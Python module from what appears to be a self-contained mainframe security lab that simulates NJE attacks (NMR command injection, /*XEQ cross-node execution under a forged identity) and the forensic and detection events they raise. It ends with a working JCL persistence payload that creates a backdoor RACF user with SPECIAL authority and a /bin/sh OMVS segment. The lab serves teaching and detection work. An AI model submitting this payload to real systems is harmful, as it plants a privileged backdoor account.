"""NJE security lab orchestration (Chapter 10).

Models the post-authentication half of the NJE kill chain once a node password
is known: NMR operator-command injection (iNJEctor.py) and cross-node job
execution via ``/*XEQ`` under a forged Job-Header identity (NJHTOUSR), including
the RACF persistence payload and the operator-visible forensics a SOC would see
($HASP122 / IEF403I / IRR010I / IEF404I and SMF type 80).

Everything runs inside Gibson against its own RACF state - it is a safe, self
contained training exercise.
"""
from __future__ import annotations

import re
from typing import Dict, List, Tuple

from gibson.core.nje import CHAPTER10_NODES

_RACF_CMD = re.compile(r"^\s*(ADDUSER|ALTUSER|ALU|PERMIT|RDEFINE|RALTER)\b", re.I)
_XEQ = re.compile(r"/\*XEQ\s+(\w+)", re.I)
_JOBNAME = re.compile(r"^//(\w+)\s+JOB\b", re.I | re.M)


def _apply_racf(state, line: str, asuser: str) -> List[str]:
    """Apply one RACF command from the remote job, returning forensic lines."""
    out: List[str] = []
    u = line.strip()
    uu = u.upper()
    try:
        if uu.startswith("ADDUSER"):
            m = re.match(r"ADDUSER\s+(\w+)", u, re.I)
            pw = re.search(r"PASS(?:WORD)?\(([^)]*)\)", u, re.I)
            special = "SPECIAL" in uu
            omvs = "OMVS(" in uu
            if m:
                uid = m.group(1).upper()
                state.racf.adduser(uid, pw.group(1) if pw else "", special=special, omvs=omvs)
                out.append(f" IRR010I USERID {uid} CREATED.")
        elif uu.startswith(("ALTUSER", "ALU")):
            m = re.match(r"(?:ALTUSER|ALU)\s+(\w+)", u, re.I)
            if m:
                uid = m.group(1).upper()
                kw = {}
                if "SPECIAL" in uu:
                    kw["special"] = True
                if "OMVS(" in uu:
                    kw["omvs"] = True
                pw = re.search(r"PASS(?:WORD)?\(([^)]*)\)", u, re.I)
                if pw:
                    kw["password"] = pw.group(1)
                state.racf.altuser(uid, **kw)
                if "SPECIAL" in uu:
                    out.append(f" IRR008I USERID {uid} ALTERED - SPECIAL ATTRIBUTE SET.")
        elif uu.startswith(("PERMIT", "RDEFINE", "RALTER")):
            res = state.dynamic_racf.command(u, asuser)
            if res:
                out.append(" " + res.splitlines()[0])
    except Exception as exc:  # never break the lab
        out.append(f" IKJ56700A RACF COMMAND ERROR: {exc}")
    return out


def xeq_execute(state, *, rhost: str, ohost: str, jcl_text: str,
                asuser: str = "", src_ip: str = "10.10.10.1") -> Tuple[List[str], Dict]:
    """Execute a cross-node job (``/*XEQ OHOST``) under the forged identity
    ``asuser`` (NJHTOUSR).  Applies any RACF commands in the job's SYSTSIN to
    the OHOST's RACF, emits the operator-visible forensics, records SMF 80 and
    fires the HMS ``nje_exec`` detection.  Returns (log_lines, info)."""
    rhost = (rhost or "GIBSON").upper()
    ohost = (ohost or "HAL").upper()
    asuser = (asuser or "IBMUSER").upper()
    jm = _JOBNAME.search(jcl_text or "")
    jobname = jm.group(1).upper() if jm else "HCKRNJE"
    jobid = "JOB" + str(abs(hash(jcl_text)) % 90000 + 10000)

    log: List[str] = []
    # $HASP122 - job received over the mesh, then IEF403I bracket
    log.append(f"{jobid} $HASP122 {jobname}({jobid} FROM {rhost} ) RECEIVED AT {ohost}")
    log.append(f"{jobid} IEF403I {jobname} - STARTED - TIME=10.57.32")

    # apply each RACF command line found in the job (the persistence payload)
    applied: List[str] = []
    for raw in (jcl_text or "").splitlines():
        if _RACF_CMD.match(raw):
            applied.append(raw.strip())
            log += [f"{jobid} READY"] + [f"{jobid}  {raw.strip()}"]
            log += [f"{jobid}{ln}" for ln in _apply_racf(state, raw, asuser)]

    log.append(f"{jobid} IEF404I {jobname} - ENDED - TIME=10.57.34")

    # SMF type 80 - the RACF changes made under the forged identity
    try:
        state.record_security_event(
            src_ip, "NJE XEQ",
            f"JOB={jobname} FROM={rhost} AT={ohost} ASUSER={asuser} "
            f"RACF_CMDS={len(applied)}",
            service="NJE", result="SUCCESS", addr=src_ip, terminal="NJE")
    except Exception:
        pass

    # HMS detection - cross-node execution / lateral movement
    try:
        from gibson.apps.cti_hms import trigger_ttp
        trigger_ttp(state, "nje_exec", src_ip=src_ip, userid=asuser,
                    detail=f"/*XEQ {ohost} as {asuser} (NJHTOUSR forged) from {rhost}")
    except Exception:
        pass

    info = {"jobname": jobname, "jobid": jobid, "ohost": ohost, "rhost": rhost,
            "asuser": asuser, "racf_cmds": applied}
    return log, info


def nmr_inject(state, network, command: str, *, src_ip: str = "10.10.10.1",
               asuser: str = "GIBSON") -> str:
    """Run an injected NMR operator command (iNJEctor.py) against the JES2
    command processor, firing the HMS ``nje_nmr`` detection."""
    reply = network.command(command) or "$HASP000 OK"
    try:
        state.record_security_event(
            src_ip, "NJE NMR", f"OPCMD={command.strip()}",
            service="NJE", result="SUCCESS", addr=src_ip, terminal="NJE")
    except Exception:
        pass
    try:
        from gibson.apps.cti_hms import trigger_ttp
        trigger_ttp(state, "nje_nmr", src_ip=src_ip, userid=asuser,
                    detail=f"NMR injection: {command.strip()}")
    except Exception:
        pass
    return reply


# The canonical Chapter-10 persistence payload (racf.jcl, Listing 10-14).
RACF_JCL = (
    "//HCKRNJE JOB (1234567),'ABC 123',CLASS=A,MSGLEVEL=(0,0),MSGCLASS=K\n"
    "/*XEQ HAL\n"
    "//TSOCMD  EXEC PGM=IKJEFT01\n"
    "//SYSTSPRT DD SYSOUT=*\n"
    "//SYSTSIN  DD *\n"
    "ADDUSER  Z4CK PASSWORD(Z4CKPASS)\n"
    "ALTUSER  Z4CK TSO(ACCTNUM(ACCT#) PROC(ISPFPROC)) SPECIAL\n"
    "ALTUSER  Z4CK OMVS(UID(31337) PROGRAM(/bin/sh) HOME(/))\n"
    "/*\n"
)
